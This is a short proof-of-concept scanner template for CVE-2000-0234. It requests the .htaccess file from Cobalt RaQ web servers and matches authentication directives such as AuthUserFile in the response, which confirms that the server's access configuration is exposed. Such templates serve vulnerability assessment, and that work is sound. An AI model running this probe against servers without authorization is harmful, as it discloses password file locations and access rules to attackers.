[info]
author = "ave"
description = "Cobalt RaQ 2.0/3.0 default Apache access.conf配置允许远程攻击者直接访问.htaccess文件，泄露密码短语、IP白名单等敏感配置信息"
id = "POC-AVE-2000-0212"
name = "CVE-2000-0234 Cobalt RaQ .htaccess Disclosure PoC"
severity = "medium"
tags = ["cve-2000-0234"]
vuln_id = [
    "CVE-2000-0234",
    "AVE-2000-0212",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.htaccess"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "AuthUserFile",
    "AuthName",
    "require",
    "AuthType",
]
